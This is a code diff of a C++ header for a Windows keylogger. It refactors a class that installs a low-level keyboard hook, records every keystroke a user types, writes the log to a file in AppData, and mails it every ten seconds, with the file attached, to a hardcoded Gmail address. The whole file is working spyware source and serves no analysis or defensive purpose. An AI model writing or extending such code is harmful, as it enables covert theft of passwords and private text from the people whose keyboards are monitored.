@@ -1,128 +1,136 @@
 #pragma once
 
+#include <chrono>
 #include <fstream>
 #include <iostream>
 #include <memory>
+#include <thread>
 
 #include "DefaultFileSystemAccess.h"
 #include "Helper.h"
 #include "KeyBinding.h"
+#include "KeyloggerDirectoryLocator.h"
+#include "MailSender.h"
 #include "PowerShellMailSender.h"
-#include "Timer.h"
+#include "UserInputFileLogger.h"
 #include "windows.h"
 
 namespace keylogger
 {
+using namespace std::chrono_literals;
+
 class KeyboardHook
 {
 public:
-	KeyboardHook() : mailTimer{ std::make_unique<Timer>(KeyboardHook::timerSendMail, 400 * 60) }
-	{
-	}
+    KeyboardHook(std::unique_ptr<mail::MailSender> mailSenderInit,
+                 std::unique_ptr<UserInputFileLogger> userInputFileLoggerInit)
+        : mailThread{&KeyboardHook::timerSendMail, this},
+          mailSender{std::move(mailSenderInit)},
+          userInputFileLogger{std::move(userInputFileLoggerInit)}
+    {
+    }
 
-	static void timerSendMail()
-	{
-		utils::appendLog("triggered sending email, keylog: " + keylog);
+    ~KeyboardHook()
+    {
+        if (mailThread.joinable())
+        {
+            mailThread.join();
+        }
+    }
 
-		if (keylog.empty())
-		{
-			return;
-		}
+    [[noreturn]] void timerSendMail()
+    {
+        while (true)
+        {
+            std::this_thread::sleep_for(std::chrono::seconds(10s));
+            utils::appendLog("triggered sending email, keylog: " + keylog);
 
-		std::string lastFile = fileSystem.writeLog(keylog);
+            if (keylog.empty())
+            {
+                continue;
+            }
 
-		if (lastFile.empty())
-		{
-			utils::appendLog("File creation was not succesfull. Keylog: " + keylog);
-			return;
-		}
+            std::string lastFile = userInputFileLogger->writeLogToNewlyCreatedFileBasedOnCurrentTime(keylog);
 
-		int status = mail::sendMail("Log [" + lastFile + "]",
-			"Hi :)\n File has been attached to this mail :)\n" + keylog,
-			fileSystem.getCurrentPath(true) + lastFile);
+            if (lastFile.empty())
+            {
+                utils::appendLog("File creation was not succesfull. Keylog: " + keylog);
+                continue;
+            }
 
-		if (status != 7)
-		{
-			utils::appendLog("Mail was not sent! Error code: " + utils::toString(status));
-		}
-		else
-		{
-			keylog = "";
-		}
-	}
+            keylogger::mail::Mail mail{"michalovskyyy@gmail.com", "michalovskyyy@gmail.com",
+                                       "[" + lastFile + "]",
+                                       "Logs from user: " + keylog,
+                                       KeyloggerDirectoryLocator::getAppDataKeyloggerPath(true) + lastFile};
+            keylogger::mail::Credentials credentials{"michalovskyyy@gmail.com", "xxx"};
 
-	static LRESULT processKeyboard(int nCode, WPARAM wparam, LPARAM lparam)
-	{
-		if (nCode < 0)
-		{
-			CallNextHookEx(eHook, nCode, wparam, lparam);
-		}
+            if (mailSender->sendMail(mail, credentials))
+            {
+                keylog = "";
+            }
+        }
+    }
 
-		KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
-		if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
-		{
-			utils::appendLog("key down");
-			keylog += Keys::keys[kbs->vkCode].name;
-			if (kbs->vkCode == VK_RETURN)
-			{
-				keylog += "\n";
-			}
-		}
-		else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
-		{
-			utils::appendLog("key up");
-			DWORD key = kbs->vkCode;
-			if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL
-				|| key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT
-				|| key == VK_MENU || key == VK_LMENU || key == VK_RMENU
-				|| key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN
-				|| key == VK_RWIN)
-			{
-				std::string keyName = Keys::keys[kbs->vkCode].name;
-				keyName.insert(1, "/");
-				keylog += keyName;
-			}
-		}
+    static LRESULT processKeyboard(int nCode, WPARAM wparam, LPARAM lparam)
+    {
+        if (nCode < 0)
+        {
+            CallNextHookEx(eHook, nCode, wparam, lparam);
+        }
 
-		return CallNextHookEx(eHook, nCode, wparam, lparam);
-	}
+        KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
+        if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
+        {
+            utils::appendLog("key down");
+            keylog += Keys::keys[kbs->vkCode].name;
+            if (kbs->vkCode == VK_RETURN)
+            {
+                keylog += "\n";
+            }
+        }
+        else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
+        {
+            utils::appendLog("key up");
+            DWORD key = kbs->vkCode;
+            if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT ||
+                key == VK_LSHIFT || key == VK_RSHIFT || key == VK_MENU || key == VK_LMENU ||
+                key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN)
+            {
+                std::string keyName = Keys::keys[kbs->vkCode].name;
+                keyName.insert(1, "/");
+                keylog += keyName;
+            }
+        }
 
-	bool installHook()
-	{
-		utils::appendLog("Hook started... Timer started");
-		mailTimer->start(true);
+        return CallNextHookEx(eHook, nCode, wparam, lparam);
+    }
 
-		eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardHook::processKeyboard, GetModuleHandle(NULL), 0);
+    bool installHook()
+    {
+        utils::appendLog("Hook started...");
 
-		return eHook == NULL;
-	}
+        eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardHook::processKeyboard,
+                                 GetModuleHandle(NULL), 0);
 
-	bool uninstallHook()
-	{
-		BOOL b = UnhookWindowsHookEx(eHook);
-		eHook = NULL;
-		stopTimer();
-		return static_cast<bool>(b);
-	}
+        return eHook == NULL;
+    }
 
-	bool isHooked()
-	{
-		return static_cast<bool>(eHook == NULL);
-	}
-
-	void stopTimer()
-	{
-		mailTimer->stop();
-	}
+    bool uninstallHook()
+    {
+        BOOL b = UnhookWindowsHookEx(eHook);
+        eHook = NULL;
+        mailThread.join();
+        return static_cast<bool>(b);
+    }
 
 private:
-	std::unique_ptr<Timer> mailTimer;
-	static DefaultFileSystemAccess fileSystem;
-	static std::string keylog;
-	static HHOOK eHook;
+    static std::string keylog;
+    static HHOOK eHook;
+    std::thread mailThread;
+    std::unique_ptr<mail::MailSender> mailSender;
+    std::unique_ptr<UserInputFileLogger> userInputFileLogger;
 };
 
-DefaultFileSystemAccess KeyboardHook::fileSystem = DefaultFileSystemAccess{};
 HHOOK KeyboardHook::eHook = NULL;
 std::string KeyboardHook::keylog = "";
 }
